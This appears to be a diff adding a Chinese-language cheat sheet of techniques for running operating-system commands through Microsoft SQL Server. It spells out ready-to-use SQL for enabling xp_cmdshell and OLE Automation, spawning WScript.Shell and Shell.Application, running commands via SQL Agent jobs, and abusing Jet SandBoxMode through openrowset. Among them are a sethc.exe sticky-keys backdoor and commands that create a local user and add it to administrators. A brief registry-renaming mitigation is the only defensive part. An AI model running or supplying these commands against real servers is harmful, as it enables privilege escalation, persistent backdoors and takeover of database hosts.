@@ -1,0 +1,147 @@
+一．xp_cmdshell
+
+EXEC master..xp_cmdshell 'ipconfig'
+
+开启xp_cmdshell:
+
+-- To allow advanced options to be changed.
+
+EXEC sp_configure 'show advanced options', 1
+
+GO
+
+-- To update the currently configured value for advanced options.
+
+RECONFIGURE
+
+GO
+
+-- To enable the feature.
+
+EXEC sp_configure 'xp_cmdshell', 1
+
+GO
+
+-- To update the currently configured value for this feature.
+
+RECONFIGURE
+
+GO
+
+二．sp_oacreate
+
+创建wscript.shell对象
+
+use master declare @o int exec sp_oacreate 'wscript.shell',@o out exec sp_oamethod @o,'run',null,'cmd /c "net user" > c:\test.tmp'
+
+创建scripting.filesystemobject对象
+
+declare @o int
+
+exec sp_oacreate 'scripting.filesystemobject', @o out
+
+exec sp_oamethod @o, 'copyfile',null,'c:\windows\explorer.exe' ,'c:\windows\system32\sethc.exe';
+
+declare @oo int
+
+exec sp_oacreate 'scripting.filesystemobject', @oo out                 exec sp_oamethod @oo, 'copyfile',null,'c:\windows\system32\sethc.exe' ,'c:\windows\system32\dllcache\sethc.exe';
+
+可以用utilman.exe代替sethc.exe达到同样的效果  后门很酷吗，呵呵
+
+创建Shell.Application对象
+
+declare @o int
+
+exec sp_oacreate 'Shell.Application', @o out
+
+exec sp_oamethod @o, 'ShellExecute',null, 'cmd.exe','cmd /c net user >c:\test.txt','c:\windows\system32','',1;
+
+开启OLE Automation Procedures
+
+sp_configure 'show advanced options', 1;
+
+GO
+
+RECONFIGURE;
+
+GO
+
+sp_configure 'Ole Automation Procedures', 1;
+
+GO
+
+RECONFIGURE;
+
+GO
+
+我们的对策就是把对象做一下手脚
+
+WScript.Shell可以调用系统内核运行DOS基本命令
+
+可以通过修改注册表，将此组件改名，来防止危害。
+
+HKEY_CLASSES_ROOT\WScript.Shell\
+
+及HKEY_CLASSES_ROOT\WScript.Shell.1\
+
+改名为其它的名字，如：改为WScript.Shell_ChangeName或WScript.Shell.1_ChangeName
+
+自己以后调用的时候使用这个就可以正常调用此组件了
+
+也要将clsid值也改一下
+
+HKEY_CLASSES_ROOT\WScript.Shell\CLSID\项目的值
+
+HKEY_CLASSES_ROOT\WScript.Shell.1\CLSID\项目的值
+
+同wscript.shell理、scripting.filesystemobject、Shell.Application
+
+三．JOB
+
+利用JOB执行命令，有一个先决条件就是开启SQLSERVERAGENT服务，下面的语句可以开启
+
+exec master.dbo.xp_servicecontrol 'start','SQLSERVERAGENT'
+
+use msdb create table [jncsql](resulttxt nvarchar(1024) null) exec sp_delete_job null,'x' exec sp_add_job 'x' exec
+
+sp_add_jobstep null,'x',null,'1','cmdexec','cmd /c "net user>c:\test.test"' exec sp_add_jobserver
+
+null,'x',@@servername exec sp_start_job 'x';
+
+四．SandBoxMode（网上常说的沙盒模式）
+
+原理：在access里调用VBS的shell函数，以system权限执行任何命令。但是试用这个函数之前必须把注册表里的一个叫SandBoxmode的开关打开，
+
+注册表：HKEY_LOCAL_MACHINE\SoFtWare\Micris
+
+oft\Jet\4.0\Engine\SandBoxmode.默认值为2，这个人键值为0表示始
+
+终禁用SandBoxmode模式，1表示对于非Acess应用程序试用SandBoxmode模式，2表示对access应用程序使用SandBoxmode模式，3则表示完全开启安全设置。//1或0都可以执行命令
+
+EXEC sp_addlinkedserver 'testsql','OLE DB Provider for Jet','Microsoft.Jet.OLEDB.4.0','c:\windows\system32\ias\ias.mdb'
+
+exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1
+
+EXEC master..xp_regread  HKEY_LOCAL_MACHINE ,'Software\Microsoft\Jet\4.0\engines','SandBoxMode'
+
+select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\ias.mdb','select shell("cmd.exe /c net user test test /add")')
+
+select * from openrowset('microsoft.jet.oledb.4.0',
+
+';database=c:\windows\system32\ias\ias.mdb','select shell("cmd.exe /c net localgroup administrators test /add")')
+
+下面是系统自带的两个mdb文件
+
+C:\WINDOWS\system32\ias\dnary.mdb
+C:\WINDOWS\system32\ias\ias.mdb
+
+总结
+
+   上述几种方法（仔细看看我都忘记有几种了，哈哈。你可以发散思维，再找出来几种）都是在默认情况下测试的，往往渗透的时候有很多限制条件，我们可以逐一克服，利用组件得到服务器信息，读取、创建文件了等等，我们还是要对权限这个词组有深层次的理解啊。
+
+附注
+      关于*.exe  c:\windows\system32\ 还有c:\windows\system32\dllcache呢
+      关于cmd.exe还有command.exe呢
+      关于net.exe还有net1.exe呢
+      Mdb文件不存在我们可以上传一个啊
+      执行命令的组件不是只有一个哦
